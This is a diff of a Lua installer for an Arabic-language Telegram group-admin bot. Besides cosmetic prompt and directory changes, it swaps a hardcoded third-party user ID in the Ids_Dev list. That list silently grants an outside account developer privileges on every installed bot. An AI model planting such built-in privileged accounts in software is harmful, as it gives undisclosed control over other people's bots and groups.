@@ -11,24 +11,24 @@ local function Load_File()
 local f = io.open("./Info_Sudo.lua", "r")  
 if not f then   
 if not redis:get(Server_TiTan.."Token_DevTiTan") then
-io.write('\n\27[1;35m⎙╮ Send Token For Bot : ارسل توكن البوت ...\n\27[0;39;49m')
+io.write('\n\27[1;35m⌔︙Send Token For Bot : ارسل توكن البوت ...\n\27[0;39;49m')
 local token = io.read()
 if token ~= '' then
 local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
 if res ~= 200 then
-io.write('\n\27[1;31m⎙╮ Token Is Communication Error\n التوكن غلط جرب مره اخره \n\27[0;39;49m')
+io.write('\n\27[1;31m⌔︙Token Is Communication Error\n التوكن غلط جرب مره اخره \n\27[0;39;49m')
 else
-io.write('\n\27[1;31m⎙╮ Done Save Token : تم حفظ التوكن \n\27[0;39;49m')
+io.write('\n\27[1;31m⌔︙Done Save Token : تم حفظ التوكن \n\27[0;39;49m')
 redis:set(Server_TiTan.."Token_DevTiTan",token)
 end 
 else
-io.write('\n\27[1;31m⎙╮ Token was not saved \n لم يتم حفظ التوكن \n\27[0;39;49m')
+io.write('\n\27[1;31m⌔︙Token was not saved \n لم يتم حفظ التوكن \n\27[0;39;49m')
 end 
 os.execute('lua TiTan.lua')
 end
 ------------------------------------------------------------------------------------------------------------
 if not redis:get(Server_TiTan.."User_DevTiTan1") then
-io.write('\n\27[1;35m⎙╮ Send UserName For Sudo : ارسل معرف المطور الاساسي ...\n\27[0;39;49m')
+io.write('\n\27[1;35m⌔︙Send UserName For Sudo : ارسل معرف المطور الاساسي ...\n\27[0;39;49m')
 local User_Sudo = io.read():gsub('@','')
 if User_Sudo ~= '' then
 local GetInfoUser = http.request("http://teamstorm.tk/GetUser?id="..User_Sudo)
@@ -38,18 +38,18 @@ io.write('\n\27[1;31m The UserName was not Saved : المعرف غلط ارسل 
 os.execute('lua TiTan.lua')
 end
 if User_Info.Info.Chek == "Is_Spam" then
-io.write('\n\27[1;31m⎙╮ Is Spam For Url : لقد قمت بالتكرار في الرابط حاول بعد دقيقتين \n\27[0;39;49m')
+io.write('\n\27[1;31m⌔︙Is Spam For Url : لقد قمت بالتكرار في الرابط حاول بعد دقيقتين \n\27[0;39;49m')
 os.execute('lua TiTan.lua')
 end
 if User_Info.Info == 'Channel' then
-io.write('\n\27[1;31m⎙╮ The UserName Is Channel : عذرا هاذا معرف قناة وليس حساب \n\27[0;39;49m')
+io.write('\n\27[1;31m⌔︙The UserName Is Channel : عذرا هاذا معرف قناة وليس حساب \n\27[0;39;49m')
 os.execute('lua TiTan.lua')
 end
-io.write('\n\27[1;31m⎙╮ The UserNamr Is Saved : تم حفظ معرف المطور واستخراج ايدي المطور\n\27[0;39;49m')
+io.write('\n\27[1;31m⌔︙The UserNamr Is Saved : تم حفظ معرف المطور واستخراج ايدي المطور\n\27[0;39;49m')
 redis:set(Server_TiTan.."User_DevTiTan1",User_Info.Info.Username)
 redis:set(Server_TiTan.."Id_DevTiTan",User_Info.Info.Id)
 else
-io.write('\n\27[1;31m⎙╮ The UserName was not Saved : لم يتم حفظ معرف المطور الاساسي\n\27[0;39;49m')
+io.write('\n\27[1;31m⌔︙The UserName was not Saved : لم يتم حفظ معرف المطور الاساسي\n\27[0;39;49m')
 end 
 os.execute('lua TiTan.lua')
 end
@@ -71,7 +71,7 @@ DevTiTan_Info_Sudo:close()
 local Run_File_TiTan = io.open("TiTan", 'w')
 Run_File_TiTan:write([[
 #!/usr/bin/env bash
-cd $HOME/TiTan
+cd $HOME/Storm
 token="]]..redis:get(Server_TiTan.."Token_DevTiTan")..[["
 while(true) do
 rm -fr ../.telegram-cli
@@ -83,7 +83,7 @@ Run_File_TiTan:close()
 local Run_SM = io.open("tk", 'w')
 Run_SM:write([[
 #!/usr/bin/env bash
-cd $HOME/TiTan
+cd $HOME/Storm
 while(true) do
 rm -fr ../.telegram-cli
 screen -S TiTan -X kill
@@ -114,7 +114,7 @@ token = sudos.Token_Bot
 UserName_Dev = sudos.UserName_TiTan
 bot_id = token:match("(%d+)")  
 Id_Dev = sudos.Id_DevTiTan
-Ids_Dev = {sudos.Id_DevTiTan,909438744,bot_id}
+Ids_Dev = {sudos.Id_DevTiTan,373906612,bot_id}
 Name_Bot = redis:get(bot_id.."Redis:Name:Bot") or "تايتان"
 ------------------------------------------------------------------------------------------------------------
 function var(value)  
